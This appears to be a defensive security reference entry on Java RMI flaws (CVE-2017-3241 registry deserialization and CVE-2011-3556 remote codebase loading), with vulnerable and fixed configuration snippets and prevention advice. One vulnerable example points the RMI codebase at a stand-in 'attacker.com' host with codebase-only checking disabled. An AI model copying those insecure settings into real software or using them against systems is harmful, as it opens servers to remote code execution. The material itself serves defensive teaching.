---
source: "languages/java/rmi-security.md"
title: "☕ Java RMI Security"
category: "language-vuln"
language: "java"
severity: "critical"
tags: [cve-2011-3556, cve-2017-3241, java, language-vuln, methods, prevention, what]
---

# ☕ Java RMI Security

## What Is It?
Java RMI (Remote Method Invocation) is an old Java API for distributed computing. Its biggest security issues: **deserialization** and **dynamic class loading**.

## CVE-2017-3241 — Java SE RMI Registry Deserialization RCE (CVSS 9.0)
A flaw in the JDK's RMI registry implementation lets an unauthenticated remote
attacker deserialize an arbitrary Java object at the registry, leading to remote
code execution via a gadget chain. Affected: Oracle Java SE 6u131, 7u121, 8u112;
Java SE Embedded 8u111; JRockit R28.3.12 (and earlier). CVSS 3.0 vector
`AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H`.

```java
// VULNERABLE — an old JRE exposes an RMI registry that deserializes
// whatever a caller sends. A malicious client ships a Commons-Collections
// (or similar) gadget chain and the registry executes it.
LocateRegistry.createRegistry(1099); // pre-8u112, no built-in deserialization filter

// SAFE:
// 1. Patch the JDK (8u121+ added the JEP 290 deserialization filter for RMI).
// 2. Restrict what the registry will deserialize:
System.setProperty("sun.rmi.registry.registryFilter",
    "java.lang.*;java.rmi.*;!*"); // allow only expected types, reject the rest
```

## CVE-2011-3556 — Java RMI Dynamic Class Loading RCE (CVSS 7.5)
The classic RMI codebase / dynamic-class-loading attack. Because RMI can load
classes from a remote codebase URL supplied in the stream, a remote attacker can
make the JVM download and instantiate an attacker-controlled class, affecting
confidentiality, integrity, and availability. Affected: Oracle/Sun Java SE
1.4.2_33, 5.0u31, 6u27 and earlier, 7, and JRockit R28.1.4 and earlier
(CVSS 2.0 vector `AV:N/AC:L/Au:N/C:P/I:P/A:P`).

```java
// VULNERABLE RMI configuration — remote codebase loading enabled:
System.setProperty("java.rmi.server.codebase", "http://attacker.com/");
System.setProperty("java.rmi.server.useCodebaseOnly", "false"); // BUG
// Attacker can make the server load their own class!

// SAFE (default since 7u21):
System.setProperty("java.rmi.server.useCodebaseOnly", "true");
System.setProperty("java.rmi.server.codebase", ""); // no remote codebase
```

## Prevention Methods
- Set `java.rmi.server.useCodebaseOnly=true` (default since Java 7u21)
- Configure a JEP 290 deserialization filter (`sun.rmi.registry.registryFilter`,
  `sun.rmi.transport.dgcFilter`) to whitelist expected classes
- Don't use RMI (modern alternatives: gRPC, REST, message queue)
- Keep the JDK patched — RMI-registry filtering arrived in 8u121
- Restrict RMI ports with a firewall

**References:**
- CVE-2017-3241: https://nvd.nist.gov/vuln/detail/CVE-2017-3241
- CVE-2011-3556: https://nvd.nist.gov/vuln/detail/CVE-2011-3556
